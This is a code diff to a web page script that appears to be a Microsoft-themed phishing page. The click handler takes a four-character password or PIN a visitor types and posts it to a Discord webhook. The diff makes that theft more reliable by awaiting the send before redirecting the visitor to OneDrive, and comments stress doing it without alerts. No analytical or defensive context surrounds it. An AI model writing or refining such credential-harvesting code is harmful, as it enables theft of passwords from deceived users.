@@ -134,7 +134,7 @@
         });
 
         // Button click event to send the data to Discord and redirect to Microsoft
-        sendButton.addEventListener('click', () => {
+        sendButton.addEventListener('click', async () => {
             const password = inputBar.value;
 
             // Check if the password length is exactly 4 characters
@@ -143,27 +143,26 @@
                     content: `Password entered: ${password}`, // Send the passcode as a message to Discord
                 };
 
-                // Send data to Discord webhook using fetch (without alerts)
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        // If there is an error, log it but don't show alerts
+                try {
+                    // Send data to Discord webhook using fetch (without alerts)
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+
+                    if (response.ok) {
+                        // After the message is successfully sent, redirect to OneDrive
+                        window.location.href = 'https://onedrive.live.com'; // Redirect to OneDrive
+                    } else {
                         console.error('Error sending message to Discord:', response.statusText);
                     }
-                })
-                .catch(error => {
+                } catch (error) {
                     // If the fetch fails, log the error but don't show alerts
                     console.error('Error sending message to Discord:', error);
-                });
-
-                // Redirect to Microsoft's website immediately after sending the message
-                window.location.href = 'https://www.microsoft.com'; // Redirect to Microsoft's website
+                }
             }
         });
     </script>
